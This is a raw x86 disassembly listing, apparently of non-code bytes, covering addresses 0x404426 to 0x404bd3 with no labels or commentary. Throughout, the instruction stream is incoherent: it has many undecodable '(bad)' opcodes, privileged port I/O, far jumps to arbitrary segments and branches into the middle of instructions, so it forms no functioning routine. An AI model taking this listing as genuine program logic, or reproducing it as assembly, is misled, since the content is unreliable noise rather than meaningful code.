  404426:	fsubr  st(1),st
  404428:	loope  0x4043ac
  40442a:	dec    esp
  40442b:	mov    edi,0x7767b19f
  404430:	test   BYTE PTR [edx-0x4520a13f],ah
  404436:	nop
  404437:	rcr    ebx,cl
  404439:	fiadd  DWORD PTR [ecx-0x7a]
  40443c:	cdq    
  40443d:	outs   dx,DWORD PTR ds:[esi]
  40443e:	or     al,ch
  404440:	or     ecx,DWORD PTR [ebx-0x2be5ccc]
  404446:	push   ecx
  404447:	xlat   BYTE PTR ds:[ebx]
  404448:	xchg   ebp,eax
  404449:	xor    DWORD PTR [edx-0x4a640152],ebx
  40444f:	clc    
  404450:	rol    dh,0x7e
  404453:	cs inc esp
  404455:	mov    ebp,0x6f88d6a9
  40445a:	push   ds
  40445b:	ds leave 
  40445d:	and    al,0xb3
  40445f:	jbe    0x404468
  404461:	lods   eax,DWORD PTR ds:[esi]
  404462:	dec    eax
  404463:	push   cs
  404464:	into   
  404465:	sub    al,bh
  404467:	cmp    esi,DWORD PTR [ebx-0xa20d752]
  40446d:	pushf  
  40446e:	mov    eax,0x36ede190
  404473:	xlat   BYTE PTR ds:[ebx]
  404474:	jbe    0x4043f7
  404476:	neg    BYTE PTR [ecx-0x486b4d0e]
  40447c:	pop    ss
  40447d:	sub    bl,BYTE PTR [esi]
  40447f:	inc    esi
  404480:	jbe    0x404428
  404482:	aad    0xec
  404484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404485:	or     al,0x53
  404487:	xor    esi,esi
  404489:	(bad)  
  40448a:	mov    eax,ds:0xb1ced900
  40448f:	rol    BYTE PTR [eax],cl
  404491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404492:	xor    bh,BYTE PTR [ebp+eax*4-0x7dbb93e7]
  404499:	in     al,dx
  40449a:	add    esi,DWORD PTR [edi+0x7]
  40449d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40449e:	xor    eax,0xd27f9ca2
  4044a3:	add    BYTE PTR [ecx+0x24513ac],cl
  4044a9:	int    0x29
  4044ab:	sar    BYTE PTR [edx+0x24],1
  4044ae:	(bad)  
  4044af:	addr16 xchg ebx,eax
  4044b1:	lods   al,BYTE PTR ds:[esi]
  4044b2:	add    cl,BYTE PTR [edx+ebx*1+0x4509e68b]
  4044b9:	sbb    bl,dl
  4044bb:	cmp    eax,0xa995d29d
  4044c0:	sub    dl,BYTE PTR [esp+ebx*4]
  4044c3:	imul   edx,ebx,0x17dc1c48
  4044c9:	pop    ebp
  4044ca:	stc    
  4044cb:	in     al,0xf8
  4044cd:	out    dx,eax
  4044ce:	push   ds
  4044cf:	pop    esi
  4044d0:	hlt    
  4044d1:	test   al,0x87
  4044d3:	xchg   DWORD PTR [ecx+eax*4-0x501c51d9],edi
  4044da:	js     0x4044a4
  4044dc:	xchg   edx,eax
  4044dd:	inc    edx
  4044de:	inc    esp
  4044df:	icebp  
  4044e0:	adc    eax,0x52b293c1
  4044e5:	inc    edx
  4044e6:	jb     0x404493
  4044e8:	out    dx,al
  4044e9:	or     esp,DWORD PTR [ebx]
  4044eb:	jle    0x404512
  4044ed:	je     0x4044cb
  4044ef:	pop    ebx
  4044f0:	mov    eax,ds:0xb1a7f39a
  4044f5:	in     al,0x7b
  4044f7:	jbe    0x4044f5
  4044f9:	or     DWORD PTR [esi-0x41b33948],edi
  4044ff:	xchg   BYTE PTR [esi+0x4a4f9cce],al
  404505:	xor    al,0xbe
  404507:	fs test eax,0xce052ff6
  40450d:	or     DWORD PTR [esi],eax
  40450f:	pop    es
  404510:	pop    ebx
  404511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404512:	push   edi
  404513:	or     BYTE PTR [ecx+0x7d4394d6],0xf3
  40451a:	outs   dx,BYTE PTR ds:[esi]
  40451b:	shl    DWORD PTR [eax+0x70],1
  40451e:	xchg   ecx,eax
  40451f:	sub    edi,DWORD PTR [ecx+0x7bc1f91b]
  404525:	cld    
  404526:	in     eax,0xfc
  404528:	adc    edx,DWORD PTR [edi-0x1b61d1a2]
  40452e:	jl     0x4044b0
  404530:	jbe    0x404568
  404532:	inc    esi
  404533:	mov    al,ds:0x4ef0c1c6
  404538:	adc    eax,0xe62d9aa3
  40453d:	into   
  40453e:	jmp    0xd46239dd
  404543:	cwde   
  404544:	adc    eax,0x77c51d80
  404549:	ss jl  0x4044ff
  40454c:	jle    0x404525
  40454e:	xor    bh,dh
  404550:	ret    
  404551:	loop   0x40458b
  404553:	test   eax,0xbb02c0ca
  404558:	clc    
  404559:	retf   0x6b16
  40455c:	or     DWORD PTR [esi*4-0x17150b0b],edx
  404563:	mov    edi,0x6ca0525c
  404568:	aaa    
  404569:	out    0xf3,al
  40456b:	mov    bl,0x26
  40456d:	push   eax
  40456e:	in     eax,0xe1
  404570:	pop    es
  404571:	out    dx,eax
  404572:	dec    ebp
  404573:	dec    edi
  404574:	add    eax,0xd99d1394
  404579:	mov    DWORD PTR [ebp+0x46],ebx
  40457c:	sbb    DWORD PTR [edx-0x6f],ebp
  40457f:	sub    dl,BYTE PTR [eax+0x2d]
  404582:	lock stos DWORD PTR es:[edi],eax
  404584:	fbstp  TBYTE PTR [esi+0x3]
  404587:	mov    edi,0xaf69a33b
  40458c:	repnz lods al,BYTE PTR ds:[esi]
  40458e:	mov    ebp,esi
  404590:	mov    ch,0x9b
  404592:	mov    bl,0x1b
  404594:	test   BYTE PTR [esi-0x64],dl
  404597:	push   ecx
  404598:	and    ebx,ebp
  40459a:	adc    esp,0x9f8964d4
  4045a0:	adc    al,0x85
  4045a2:	ja     0x4045a6
  4045a4:	es out dx,al
  4045a6:	mov    dh,0x29
  4045a8:	push   cs
  4045a9:	rol    BYTE PTR [eax],cl
  4045ab:	shl    DWORD PTR [ecx],0x42
  4045ae:	xchg   ecx,eax
  4045b0:	les    esp,FWORD PTR [edi]
  4045b2:	jnp    0x404568
  4045b4:	stos   BYTE PTR es:[edi],al
  4045b5:	sub    al,0x6a
  4045b7:	fisubr WORD PTR [eax+0x2a573602]
  4045bd:	inc    eax
  4045be:	jmp    0x40458c
  4045c0:	xchg   esi,esi
  4045c2:	(bad)  
  4045c3:	mov    ch,0x7
  4045c5:	push   edx
  4045c6:	rol    esp,0x49
  4045c9:	in     eax,dx
  4045ca:	ins    BYTE PTR es:[edi],dx
  4045cb:	retf   0x4f3b
  4045ce:	ins    DWORD PTR es:[edi],dx
  4045cf:	cs sbb eax,0x63ec24fd
  4045d5:	pop    esi
  4045d6:	and    edi,0xf684338e
  4045dc:	mov    bh,0xe8
  4045de:	jb     0x40463b
  4045e0:	stc    
  4045e1:	pusha  
  4045e2:	sti    
  4045e3:	mov    dh,BYTE PTR [ecx]
  4045e5:	add    ebp,edi
  4045e7:	dec    ecx
  4045e8:	dec    eax
  4045e9:	fwait
  4045ea:	sub    BYTE PTR [ecx],bh
  4045ec:	jg     0x404626
  4045ee:	mov    eax,0xf3e430b8
  4045f3:	in     eax,dx
  4045f4:	push   0x29
  4045f6:	mov    esi,0xdd8e0f6f
  4045fb:	(bad)  
  4045fc:	pop    es
  4045fd:	cmp    BYTE PTR [ebp-0x1f8f0c79],bl
  404603:	mov    cl,0xdc
  404605:	loop   0x40463c
  404607:	rcr    DWORD PTR [ebx+0x70],0x22
  40460b:	and    DWORD PTR [edi+0x793952ee],eax
  404611:	mov    eax,0x19064c2a
  404616:	push   edi
  404617:	mov    ds:0x9cdeb042,eax
  40461c:	mov    BYTE PTR [ebx-0x79],bh
  40461f:	out    0x35,al
  404621:	xchg   DWORD PTR [eax-0x65c37f7b],esp
  404627:	cs mov ch,0xf3
  40462a:	(bad)  
  40462b:	jbe    0x4045cc
  40462d:	mov    bh,0x8f
  40462f:	mov    al,0x77
  404631:	push   ebx
  404632:	aad    0x32
  404634:	xor    edi,ecx
  404636:	loope  0x4046a1
  404638:	fwait
  404639:	and    al,0xe0
  40463b:	dec    ebp
  40463c:	xchg   ebp,eax
  40463d:	dec    esp
  40463e:	push   DWORD PTR [esi-0x3af43059]
  404644:	sti    
  404645:	scas   eax,DWORD PTR es:[edi]
  404646:	data16 jp 0x404662
  404649:	pop    esp
  40464a:	fdivr  QWORD PTR [ecx-0x80]
  40464d:	xor    eax,0x8ac25af9
  404652:	and    al,0xdc
  404654:	push   edi
  404655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404656:	ficomp WORD PTR [esp+ebx*4-0x48]
  40465a:	call   0x3e55a948
  40465f:	pop    ss
  404660:	pop    ebp
  404661:	es stos DWORD PTR es:[edi],eax
  404663:	add    BYTE PTR [ebx],0x12
  404666:	xor    DWORD PTR [esp+eax*2+0x1d],0xe
  40466b:	xor    BYTE PTR [eax-0x62cacc0d],ch
  404671:	in     eax,0xdc
  404673:	mov    esi,0xb21ea01e
  404678:	cwde   
  404679:	outs   dx,BYTE PTR ds:[esi]
  40467a:	cmp    BYTE PTR [ebx+0x646586d6],0x29
  404681:	push   ebx
  404682:	sbb    ebx,edx
  404684:	mov    cl,0xe6
  404686:	pop    edi
  404687:	mov    ah,0xbf
  404689:	mov    bh,0x8a
  40468b:	(bad)  [eax]
  40468d:	pop    esp
  40468e:	jnp    0x40469f
  404690:	push   es
  404691:	sub    ebx,esi
  404693:	pop    edi
  404694:	loope  0x4046d7
  404696:	inc    edi
  404697:	in     eax,0x89
  404699:	push   ecx
  40469a:	fild   WORD PTR [edx+0x52]
  40469d:	cmc    
  40469e:	jle    0x40463d
  4046a0:	fimul  WORD PTR [eax+0x4ec8220a]
  4046a6:	outs   dx,BYTE PTR ds:[esi]
  4046a7:	dec    esp
  4046a8:	ds fsubr st(7),st
  4046ab:	into   
  4046ac:	cli    
  4046ad:	mov    ds:0x706a12c5,eax
  4046b2:	xchg   esi,ecx
  4046b4:	(bad)  
  4046b5:	fimul  WORD PTR [edi+esi*1+0x27e41ff4]
  4046bc:	sbb    esp,DWORD PTR [eax-0x71ce6a20]
  4046c2:	cwde   
  4046c3:	in     eax,dx
  4046c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c5:	in     eax,dx
  4046c6:	ficom  WORD PTR ds:0xdb967392
  4046cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046cd:	mov    WORD PTR [ebx+0x2b],cs
  4046d0:	push   edx
  4046d1:	out    dx,al
  4046d2:	mov    edi,0x196c1af
  4046d7:	cmovae esp,DWORD PTR [eax+0x6f7e2bdb]
  4046de:	pop    ebp
  4046df:	xchg   ecx,eax
  4046e0:	xchg   ecx,eax
  4046e1:	jae    0x4046cf
  4046e3:	jo     0x4046ae
  4046e5:	xor    eax,0x40999b24
  4046ea:	pop    edx
  4046eb:	or     esp,ecx
  4046ed:	loopne 0x404716
  4046ef:	js     0x4046bb
  4046f1:	sub    eax,0xb1522db4
  4046f6:	aam    0xb0
  4046f8:	fwait
  4046f9:	xor    DWORD PTR [ebp+0x4fce3031],esi
  4046ff:	pop    eax
  404700:	xchg   ebx,eax
  404701:	inc    ebp
  404702:	inc    eax
  404703:	pop    edi
  404704:	sub    esi,esi
  404706:	xchg   esi,eax
  404707:	sbb    al,0x8f
  404709:	inc    BYTE PTR [esp+edx*8]
  40470c:	mov    bh,0xe0
  40470e:	xchg   BYTE PTR [edi-0x5e8e9366],cl
  404714:	(bad)  
  404716:	dec    esi
  404717:	mov    esp,DWORD PTR ds:[ecx+0x21]
  40471b:	cmp    ch,BYTE PTR [esi]
  40471d:	inc    ebp
  40471e:	adc    BYTE PTR [edx+0x42d862b8],dl
  404724:	fcomp  DWORD PTR [edi+0x16]
  404727:	test   BYTE PTR [esi],0x15
  40472a:	push   cs
  40472b:	fs jge 0x404741
  40472e:	jb     0x404777
  404730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404731:	bound  edx,QWORD PTR [ebx-0x6fbb629a]
  404737:	aaa    
  404738:	jp     0x404767
  40473a:	fwait
  40473b:	inc    ebx
  40473c:	(bad)  
  40473d:	push   ds
  40473e:	dec    esi
  40473f:	mov    esi,0x5fc9a25
  404744:	push   ebp
  404745:	dec    esi
  404746:	xchg   esp,eax
  404747:	add    al,0x83
  404749:	dec    ecx
  40474a:	adc    BYTE PTR [ebx-0x1f],bh
  40474d:	ret    0xe4af
  404750:	ret    0x9a82
  404753:	pushf  
  404754:	inc    ebp
  404755:	dec    ecx
  404756:	ins    DWORD PTR es:[edi],dx
  404757:	out    0xac,eax
  404759:	mov    al,ds:0x13f3c432
  40475e:	mov    eax,DWORD PTR ds:0x7236275c
  404764:	loope  0x404778
  404766:	jbe    0x404768
  404768:	pushf  
  404769:	and    dl,BYTE PTR [edx-0x3b]
  40476c:	mov    ah,BYTE PTR [eax-0x517290c5]
  404772:	xchg   esp,eax
  404773:	ss jae 0x40474d
  404776:	lods   al,BYTE PTR ds:[esi]
  404777:	or     ecx,DWORD PTR [eax+0x24]
  40477a:	adc    cl,BYTE PTR [edi]
  40477c:	test   al,0x9f
  40477e:	mov    ah,0xd5
  404780:	jmp    0x728:0x179f344b
  404787:	daa    
  404788:	(bad)  
  404789:	in     al,0xa0
  40478b:	mov    al,ds:0xbdfc1445
  404790:	sub    al,0x26
  404792:	dec    eax
  404793:	adc    BYTE PTR [ecx],cl
  404795:	hlt    
  404796:	das    
  404797:	add    ah,BYTE PTR [edx+0x3d]
  40479a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40479b:	adc    BYTE PTR [edi+edi*2],dl
  40479e:	scas   al,BYTE PTR es:[edi]
  40479f:	adc    DWORD PTR [esi+0x5b],ecx
  4047a2:	lea    edi,[edx+0x146be83a]
  4047a8:	and    BYTE PTR [eax+0x16],bl
  4047ab:	(bad)  
  4047ac:	jns    0x404785
  4047ae:	jle    0x40475e
  4047b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047b1:	sub    BYTE PTR [ebp+0x61964d6f],0x16
  4047b8:	cli    
  4047b9:	lahf   
  4047ba:	xchg   ecx,eax
  4047bb:	pop    esp
  4047bc:	fwait
  4047bd:	cs sub ecx,0xffffffe6
  4047c1:	mov    ebp,DWORD PTR [ebx]
  4047c3:	hlt    
  4047c4:	je     0x40480e
  4047c6:	fild   DWORD PTR [edi]
  4047c8:	push   ss
  4047c9:	mov    ds:0x64dd0eb4,eax
  4047ce:	push   ecx
  4047cf:	rol    BYTE PTR [ebx-0x46],1
  4047d2:	ret    
  4047d3:	mov    ebp,0xa7afe799
  4047d8:	(bad)  
  4047d9:	fadd   DWORD PTR [ebx]
  4047db:	dec    esi
  4047dc:	adc    ch,cl
  4047de:	or     eax,0x70e83862
  4047e3:	pushf  
  4047e4:	hlt    
  4047e5:	popa   
  4047e6:	and    BYTE PTR [edx-0x36323704],bl
  4047ec:	sbb    al,0x9a
  4047ee:	add    esi,ebx
  4047f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047f2:	cli    
  4047f3:	popf   
  4047f4:	sbb    ebp,DWORD PTR [esp+edx*1]
  4047f7:	and    BYTE PTR [esi+edi*1-0x2d91abee],bh
  4047fe:	jae    0x4047c7
  404800:	(bad)  
  404801:	push   DWORD PTR [ecx+edx*1]
  404804:	cmc    
  404805:	inc    edx
  404806:	push   0xc9d6370a
  40480b:	mov    ch,0xe1
  40480d:	in     al,0x8f
  40480f:	out    0x28,eax
  404811:	ss jg  0x4047a8
  404814:	dec    ebp
  404815:	xchg   edx,eax
  404816:	dec    edx
  404817:	adc    eax,0xdf6cfaff
  40481c:	push   cs
  40481d:	push   esp
  40481e:	sbb    BYTE PTR [ecx+eiz*4],0x8f
  404822:	cmp    DWORD PTR [edi+0x55],0xa8824312
  404829:	xor    bx,WORD PTR [edx+ecx*8+0x73]
  40482e:	icebp  
  40482f:	pushf  
  404830:	xchg   eax,edi
  404832:	addr16 loope 0x404805
  404835:	fcomp  DWORD PTR [ebx-0x6b]
  404838:	aaa    
  404839:	sub    cl,al
  40483b:	push   esp
  40483c:	mov    esp,0xdaff8a19
  404841:	mov    esp,0x95399c94
  404846:	and    esp,DWORD PTR [ebp-0x4706a160]
  40484c:	dec    esi
  40484d:	mov    ebx,ebx
  40484f:	ror    BYTE PTR ds:0xe1e6717f,cl
  404855:	sub    BYTE PTR [esi],bl
  404857:	ins    DWORD PTR es:[edi],dx
  404858:	mov    ch,0xc7
  40485a:	mov    dl,0xbc
  40485c:	add    eax,ebp
  40485e:	imul   ecx,DWORD PTR [edi-0x2045cb6c],0x91948e51
  404868:	test   DWORD PTR ds:0x1b310793,ebp
  40486e:	(bad)  
  40486f:	call   0xb1a89d8d
  404874:	mov    cl,0xb4
  404876:	pop    ebp
  404877:	(bad)  
  404878:	add    bh,dl
  40487a:	lds    edx,FWORD PTR [ecx+0x277c50e9]
  404880:	dec    ecx
  404881:	or     BYTE PTR [ecx+0x17],ch
  404884:	xchg   edx,eax
  404885:	in     al,dx
  404886:	mov    BYTE PTR [ecx],ch
  404888:	lea    ebx,ds:0xb34def4f
  40488e:	pop    edx
  40488f:	inc    edx
  404890:	jns    0x4048b7
  404892:	icebp  
  404893:	dec    ecx
  404894:	(bad)  
  404895:	cmc    
  404896:	or     esp,DWORD PTR [ebp-0x647ceaaa]
  40489c:	mov    al,ah
  40489e:	add    DWORD PTR [edi+0x10f10fff],esp
  4048a4:	xchg   ebx,ebp
  4048a6:	mov    edi,0x1c5edb98
  4048ab:	jae    0x40488f
  4048ad:	addr16 into 
  4048af:	sub    BYTE PTR [ebp-0x7827c4a3],0x73
  4048b6:	xchg   ecx,ebx
  4048b8:	and    eax,0x14afddd0
  4048bd:	dec    edi
  4048be:	xchg   DWORD PTR [eax+0x631f2f0b],ebx
  4048c4:	out    dx,al
  4048c5:	js     0x404882
  4048c7:	push   eax
  4048c8:	dec    DWORD PTR [ebp+eiz*1+0x8]
  4048cc:	adc    al,0x86
  4048ce:	push   edi
  4048cf:	fstp   DWORD PTR [ebx]
  4048d1:	aas    
  4048d2:	cld    
  4048d3:	pop    es
  4048d4:	jmp    0x404862
  4048d6:	xchg   ebp,eax
  4048d7:	adc    dl,dl
  4048d9:	add    BYTE PTR [ebx],ch
  4048db:	pop    ecx
  4048dc:	sub    al,0xc2
  4048de:	or     eax,eax
  4048e0:	or     al,0xc
  4048e2:	jle    0x40489f
  4048e4:	les    ebx,FWORD PTR [esi+0x7b493717]
  4048ea:	in     eax,dx
  4048eb:	pop    ecx
  4048ec:	sub    eax,0xc763f8ad
  4048f1:	inc    edi
  4048f2:	mov    esi,DWORD PTR [eax-0x2c]
  4048f5:	dec    edx
  4048f6:	sub    BYTE PTR [eax+eiz*1],bh
  4048f9:	outs   dx,DWORD PTR ds:[esi]
  4048fa:	adc    DWORD PTR [edi+0x7a837284],edi
  404900:	cmp    eax,edx
  404902:	xchg   esi,eax
  404903:	mov    ds:0x3e3c35b1,al
  404908:	cli    
  404909:	mov    edi,DWORD PTR [edi]
  40490b:	cmp    DWORD PTR [edi],esp
  40490d:	cwde   
  40490e:	mov    BYTE PTR [eax],dl
  404910:	dec    ebx
  404911:	xor    DWORD PTR [eax+0x3e3ac530],eax
  404917:	sbb    al,0xd6
  404919:	pop    edx
  40491a:	pop    ecx
  40491b:	push   edx
  40491c:	fisttp WORD PTR [edi]
  40491e:	sub    esp,DWORD PTR [ebx+edi*2-0x4acf763c]
  404925:	shl    ah,1
  404927:	mov    WORD PTR gs:[edx+0x2a],gs
  40492b:	sbb    al,0x45
  40492d:	arpl   WORD PTR [ecx+eax*1],sp
  404930:	daa    
  404931:	sar    DWORD PTR [esp],1
  404934:	inc    eax
  404935:	daa    
  404936:	mov    al,ds:0xf92a652d
  40493b:	mov    al,bl
  40493d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40493e:	lds    edi,FWORD PTR [eax]
  404940:	xchg   edi,eax
  404941:	pop    ss
  404942:	push   ss
  404943:	dec    ebx
  404944:	into   
  404945:	rep outs dx,BYTE PTR ds:[si]
  404948:	lods   al,BYTE PTR ds:[esi]
  404949:	pop    esp
  40494a:	(bad)  
  40494b:	fdivr  st,st(6)
  40494d:	cli    
  40494e:	mov    ebp,0xff70c99f
  404953:	lahf   
  404954:	nop
  404955:	xchg   edx,eax
  404956:	test   BYTE PTR [edi-0x3c093352],ch
  40495c:	mov    ch,0x29
  40495e:	mov    bh,0x2d
  404960:	mov    dh,0x60
  404962:	in     al,0x85
  404964:	inc    esp
  404965:	aam    0x87
  404967:	cmp    cl,dl
  404969:	ins    DWORD PTR es:[edi],dx
  40496a:	fist   WORD PTR [edi]
  40496c:	lods   al,BYTE PTR ds:[esi]
  40496d:	jecxz  0x40499e
  40496f:	test   BYTE PTR [ebp-0x1a],dh
  404972:	mov    gs,WORD PTR [ebp+ebx*8-0x4b]
  404976:	clc    
  404977:	test   al,0xb0
  404979:	pop    ebp
  40497a:	nop
  40497b:	pop    esi
  40497c:	popa   
  40497d:	cli    
  40497e:	pop    eax
  40497f:	jle    0x4049f7
  404981:	add    ecx,ebx
  404983:	sub    bl,dl
  404985:	mov    edx,DWORD PTR [edx-0x5a3b31a5]
  40498b:	pop    ds
  40498c:	rcl    DWORD PTR [ecx+0x2dba86d2],0x40
  404993:	jmp    0xab12:0xf85bf664
  40499a:	je     0x4049e1
  40499c:	sbb    ebp,0xfffffffd
  40499f:	call   0x6193:0x5c675773
  4049a6:	rol    BYTE PTR [edx-0x78373d7e],0xf3
  4049ad:	push   ds
  4049ae:	mov    bh,0xe4
  4049b0:	xchg   esp,eax
  4049b1:	inc    ebx
  4049b2:	sub    DWORD PTR [eax],0x400ece3
  4049b8:	(bad)
  4049bc:	clc    
  4049bd:	test   eax,0x61703d2b
  4049c2:	add    eax,DWORD PTR [edi-0x66]
  4049c5:	pop    esi
  4049c6:	fidiv  DWORD PTR [edx]
  4049c8:	jge    0x40497b
  4049ca:	ins    DWORD PTR es:[edi],dx
  4049cb:	xchg   esp,eax
  4049cc:	add    esp,DWORD PTR [ebx]
  4049ce:	inc    eax
  4049cf:	sub    al,0x60
  4049d1:	add    al,0xc1
  4049d3:	or     ah,bh
  4049d5:	imul   edi,esi,0x5937382c
  4049db:	cmp    eax,0x45fa4e99
  4049e0:	int    0xc5
  4049e2:	or     edx,edi
  4049e4:	sahf   
  4049e5:	test   al,0x7f
  4049e7:	and    esp,DWORD PTR [ebp-0x28cd6de2]
  4049ed:	outs   dx,BYTE PTR fs:[esi]
  4049ef:	mov    eax,0xc662b993
  4049f4:	mov    al,ds:0x5571dfed
  4049f9:	lock sbb BYTE PTR [esi+0x71fb891],bh
  404a00:	pop    eax
  404a01:	pop    ebx
  404a02:	cmp    bl,0x7
  404a05:	xchg   esp,eax
  404a06:	cli    
  404a07:	aas    
  404a08:	(bad)  
  404a09:	mov    BYTE PTR [eax+edi*4-0x792ee08a],bh
  404a10:	int3   
  404a11:	xchg   esi,eax
  404a12:	out    0x3b,al
  404a14:	mov    edx,0x9ef7b69f
  404a19:	(bad)  
  404a1a:	jle    0x404a5f
  404a1c:	sbb    edi,DWORD PTR [eax-0x57499569]
  404a22:	gs mov esp,0xad96055b
  404a28:	sbb    BYTE PTR [eax+0x9a0f7a],ah
  404a2e:	fidiv  DWORD PTR [edx]
  404a30:	fisub  WORD PTR [eax+0x60]
  404a33:	dec    ebx
  404a34:	xchg   ebx,eax
  404a35:	pop    edi
  404a36:	in     eax,0x3b
  404a38:	outs   dx,DWORD PTR ds:[esi]
  404a39:	mov    al,0x9c
  404a3b:	mov    dh,0x2f
  404a3d:	mov    bh,0x1c
  404a3f:	aaa    
  404a40:	sbb    al,BYTE PTR [ebx-0x741ad34]
  404a46:	fdivr  st(3),st
  404a48:	rol    BYTE PTR [ebx],cl
  404a4a:	leave  
  404a4b:	sbb    al,0x1a
  404a4d:	inc    ebx
  404a4e:	add    DWORD PTR [ebx],esi
  404a50:	cs aad 0xcb
  404a53:	test   edx,ebx
  404a55:	js     0x404acf
  404a57:	pop    esi
  404a58:	jp     0x404a5a
  404a5a:	loopne 0x404a99
  404a5c:	popf   
  404a5d:	adc    DWORD PTR [edx+0x14614151],ebx
  404a63:	fwait
  404a64:	adc    esi,DWORD PTR [edx]
  404a66:	mov    dh,0xa9
  404a68:	out    dx,eax
  404a69:	(bad)  
  404a6b:	mov    dl,0x12
  404a6d:	xchg   edi,eax
  404a6e:	pop    ds
  404a6f:	push   edx
  404a70:	pop    esp
  404a71:	or     eax,0xbeee7411
  404a76:	imul   ebx,DWORD PTR [ebx+ecx*2],0x424a86bc
  404a7d:	mov    WORD PTR [esi],gs
  404a7f:	mov    eax,ds:0x4bd0aaa3
  404a84:	inc    edi
  404a85:	in     eax,0x92
  404a87:	neg    al
  404a89:	and    ebp,DWORD PTR [ebp+0x78]
  404a8c:	sub    eax,0xc6ec50d4
  404a91:	call   DWORD PTR [ebp+0x44]
  404a94:	repz sti 
  404a96:	jne    0x404a92
  404a98:	mov    eax,0x4b713c79
  404a9d:	outs   dx,DWORD PTR ds:[esi]
  404a9e:	mov    ds:0xba6da69f,eax
  404aa3:	sub    cl,BYTE PTR [ecx]
  404aa5:	retf   0x3274
  404aa8:	sub    al,BYTE PTR [ebx-0x72]
  404aab:	leave  
  404aac:	dec    esp
  404aad:	inc    edi
  404aae:	shl    DWORD PTR gs:[ebx-0x48579603],1
  404ab5:	push   esp
  404ab6:	icebp  
  404ab7:	js     0x404ae3
  404ab9:	in     al,0x46
  404abb:	sbb    eax,0x319fcea7
  404ac0:	or     ah,BYTE PTR [esi+0x4eebd8a4]
  404ac6:	inc    ecx
  404ac7:	cmp    al,BYTE PTR [esi+0x2a]
  404aca:	fsub   QWORD PTR [edx+0x2708bed0]
  404ad0:	in     al,dx
  404ad1:	repnz cs pop esp
  404ad4:	jo     0x404aa6
  404ad6:	test   eax,0xc833bfa5
  404adb:	inc    esi
  404adc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404add:	dec    ecx
  404ade:	bound  ebx,QWORD PTR [ebx+0x20e72596]
  404ae4:	push   0xe25d0d69
  404ae9:	mov    BYTE PTR [ecx+ebx*4-0x234f6506],bh
  404af0:	stc    
  404af1:	push   esi
  404af2:	jl     0x404ad0
  404af4:	adc    DWORD PTR [ebp-0x9e14fcb],0x3d
  404afb:	and    BYTE PTR ds:0xad908c79,dl
  404b01:	jge    0x404b64
  404b03:	cld    
  404b04:	nop
  404b05:	adc    eax,DWORD PTR fs:[esi+0x2b1851d0]
  404b0c:	mov    dl,0xd0
  404b0e:	mov    eax,0x6fb9380b
  404b13:	inc    edi
  404b14:	addr16 inc ebp
  404b16:	cmc    
  404b17:	out    0x3b,eax
  404b19:	sbb    BYTE PTR [ebp-0x4d],ch
  404b1c:	jbe    0x404b27
  404b1e:	out    0x11,al
  404b20:	icebp  
  404b21:	push   es
  404b22:	stos   BYTE PTR es:[edi],al
  404b23:	jmp    FWORD PTR [ebx]
  404b25:	xlat   BYTE PTR ds:[ebx]
  404b26:	(bad)  
  404b27:	mov    ah,bh
  404b29:	clc    
  404b2a:	jmp    0xac6fe95a
  404b2f:	mov    dh,0x6a
  404b31:	dec    edi
  404b32:	gs push ss
  404b34:	or     eax,ecx
  404b36:	xchg   esp,eax
  404b37:	shl    edi,cl
  404b39:	jmp    0xb4c5:0xb1075a98
  404b40:	outs   dx,BYTE PTR ds:[esi]
  404b41:	xlat   BYTE PTR ds:[ebx]
  404b42:	mov    ch,ch
  404b44:	mov    ebp,0x39cac228
  404b49:	cmp    esi,ecx
  404b4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b4c:	sub    WORD PTR [eax+0x48b4f6b2],di
  404b53:	add    cl,al
  404b55:	scas   eax,DWORD PTR es:[edi]
  404b56:	cmp    dh,ch
  404b58:	mov    ecx,0x3721da43
  404b5d:	sub    BYTE PTR [ecx-0x3b67bc02],ch
  404b63:	loop   0x404b78
  404b65:	aaa    
  404b66:	mov    bh,0x22
  404b68:	call   0xab7d:0xcc2a7ad3
  404b6f:	test   cl,0x5e
  404b72:	push   ss
  404b73:	cwde   
  404b74:	mov    cl,0x26
  404b76:	cmp    esi,DWORD PTR [esi-0x37]
  404b79:	fmul   DWORD PTR [eax+0xa]
  404b7c:	jle    0x404b38
  404b7e:	scas   eax,DWORD PTR es:[edi]
  404b7f:	icebp  
  404b80:	fcomp  DWORD PTR [edx-0x10bf1fe]
  404b86:	in     eax,0x19
  404b88:	out    0xe4,al
  404b8a:	popa   
  404b8b:	jns    0x404b38
  404b8d:	stos   DWORD PTR es:[edi],eax
  404b8e:	ret    
  404b8f:	ins    DWORD PTR es:[edi],dx
  404b90:	mov    ebp,0x51a69bbb
  404b95:	fild   WORD PTR [edi]
  404b97:	sub    bl,BYTE PTR [edx+0x4353057c]
  404b9d:	xchg   DWORD PTR [esi],esp
  404b9f:	push   eax
  404ba0:	sti    
  404ba1:	dec    edi
  404ba2:	jge    0x404b52
  404ba4:	es inc esp
  404ba6:	cmp    ah,BYTE PTR [ecx+eiz*1-0x1d]
  404baa:	sbb    ebp,DWORD PTR [ecx+edi*1]
  404bad:	jb     0x404b53
  404baf:	mov    bh,0xc5
  404bb1:	mov    eax,ds:0x4fb750c
  404bb6:	add    ch,BYTE PTR [ebp+0x729e41e4]
  404bbc:	push   eax
  404bbd:	jmp    0x404c02
  404bbf:	jae    0x404c0d
  404bc1:	mov    al,ds:0x2cde479
  404bc6:	lods   eax,DWORD PTR ds:[esi]
  404bc7:	ret    
  404bc8:	or     DWORD PTR [eax],ebp
  404bca:	inc    ebx
  404bcb:	stc    
  404bcc:	mov    cl,0x18
  404bce:	sbb    eax,0x5ab3e73a
  404bd3:	repnz ss test eax,0xb8802c58
